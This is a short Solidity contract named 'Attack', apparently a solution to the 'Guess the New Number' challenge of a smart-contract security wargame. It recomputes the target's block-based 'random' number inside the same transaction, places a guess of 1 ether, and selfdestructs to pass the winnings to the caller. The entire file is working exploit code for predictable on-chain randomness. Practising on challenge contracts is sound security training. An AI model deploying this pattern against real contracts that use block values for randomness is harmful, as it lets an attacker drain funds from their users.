// SPDX-License-Identifier: MIT
pragma solidity 0.4.22;

import "./GuessTheNewNumber.sol";

contract Attack {
	GuessTheNewNumberChallenge private target;

	constructor(address _address) {
		target = GuessTheNewNumberChallenge(_address);
	}

	function hack() public payable{
		require(msg.value == 1 ether);

		uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

		target.guess.value(1 ether)(answer);

		// transfer all the remaining funds to the attacker
		selfdestruct(msg.sender);
	}

	//get the ether using fallback fn.
	function() public payable {}
}